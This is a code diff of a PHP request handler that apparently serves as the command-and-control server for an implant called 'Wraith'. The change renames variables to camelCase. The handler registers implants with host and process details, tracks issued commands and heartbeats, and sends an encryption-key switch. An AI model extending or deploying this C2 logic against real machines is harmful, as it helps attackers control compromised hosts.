@@ -6,19 +6,19 @@ class Handler_proto_v_0 {
 
     // Handler properties
     private $db; // Copy of the database connection
-    private $c_type; // Who the request is from
-    private $c_address; // The IP address of the client
-    private $c_data; // The data to be processed
+    private $cType; // Who the request is from
+    private $cAddress; // The IP address of the client
+    private $cData; // The data to be processed
     private $SETTINGS; // A copy of the API settings
     private $response = []; // The response dict sent when responding
 
-    function __construct($db, $client_type, $client_address, $client_data, $SETTINGS) {
+    function __construct($db, $clientType, $clientAddress, $clientData, $SETTINGS) {
 
         // Copy args to private properties
         $this->db = $db;
-        $this->c_type = $client_type;
-        $this->c_address = $client_address;
-        $this->c_data = $client_data;
+        $this->cType = $clientType;
+        $this->cAddress = $clientAddress;
+        $this->cData = $clientData;
         $this->SETTINGS = $SETTINGS;
 
     }
@@ -32,41 +32,41 @@ class Handler_proto_v_0 {
 
     }
 
-    function handle_request() {
+    function handleRequest() {
 
         // If the handler was created, the client has passed all checks
         // so it is safe to add the API fingerprint to the response
-        $this->response["api_fingerprint"] = $this->SETTINGS["APIFingerprint"];
+        $this->response["APIFingerprint"] = $this->SETTINGS["APIFingerprint"];
 
         // Determine if the client is a panel or Wraith
-        if ($this->c_type === "wraith") {
+        if ($this->cType === "wraith") {
 
             // Wraith
 
             // Wraith is logging in
-            if ($this->c_data["req_type"] === "handshake") {
+            if ($this->cData["reqType"] === "handshake") {
 
                 // Ensure that the required fields are present in the request
                 if (
-                    !has_keys($this->c_data, [
-                        "host_info",
-                        "wraith_info",
+                    !hasKeys($this->cData, [
+                        "hostInfo",
+                        "wraithInfo",
                     ]) ||
-                    !has_keys($this->c_data["host_info"], [
+                    !hasKeys($this->cData["hostInfo"], [
                         "arch",
                         "hostname",
-                        "os_type",
-                        "os_version",
-                        "reported_ip",
+                        "osType",
+                        "osVersion",
+                        "reportedIP",
                     ]) ||
-                    !has_keys($this->c_data["wraith_info"], [
+                    !hasKeys($this->cData["wraithInfo"], [
                         "version",
-                        "start_time",
+                        "startTime",
                         "plugins",
                         "env",
                         "pid",
                         "ppid",
-                        "running_user",
+                        "runningUser",
                     ])
                 ) {
 
@@ -78,17 +78,17 @@ class Handler_proto_v_0 {
                 }
 
                 // Add the connecting IP to the host info array
-                $this->c_data["host_info"]["connecting_ip"] = get_client_ip();
+                $this->cData["hostInfo"]["connectingIP"] = getClientIP();
                 // Add a generated fingerprint to the host info array
-                $this->c_data["host_info"]["fingerprint"] = "";
+                $this->cData["hostInfo"]["fingerprint"] = "";
 
                 // Create a database entry for the Wraith
-                db_add_wraiths([
-                    "AssignedID" => uniqid(),
-                    "HostProperties" => json_encode($this->c_data["host_info"]),
-                    "WraithProperties" => json_encode($this->c_data["wraith_info"]),
-                    "LastHeartbeatTime" => time(),
-                    "IssuedCommands" => json_encode([]),
+                dbAddWraith([
+                    "assignedID" => uniqid(),
+                    "hostProperties" => json_encode($this->cData["hostInfo"]),
+                    "wraithProperties" => json_encode($this->cData["wraithInfo"]),
+                    "lastHeartbeatTime" => time(),
+                    "issuedCommands" => json_encode([]),
                 ]);
 
                 // Return a successful status and message
@@ -97,20 +97,20 @@ class Handler_proto_v_0 {
 
                 // Add an encryption key switch command to switch to a
                 // more secure, non-hard-coded encryption key
-                $this->response["switch_key"] = $this->SETTINGS["WraithSwitchCryptKey"];
+                $this->response["switchKey"] = $this->SETTINGS["wraithSwitchCryptKey"];
 
                 // Respond
                 return;
 
-            // Wraith is sending heartbeat
-            } else if ($this->c_data["req_type"] === "heartbeat") {
+                // Wraith is sending heartbeat
+            } else if ($this->cData["reqType"] === "heartbeat") {
 
-                // TODO
+                    // TODO
 
-            // Wraith is uploading a file
-            } else if ($this->c_data["req_type"] === "upload") {
+                // Wraith is uploading a file
+            } else if ($this->cData["reqType"] === "upload") {
 
-                // TODO
+                    // TODO
 
             // Unrecognised request type
             } else {
@@ -121,7 +121,7 @@ class Handler_proto_v_0 {
 
             }
 
-        } else if ($this->c_type === "panel") {
+        } else if ($this->cType === "panel") {
 
             // Panel
 
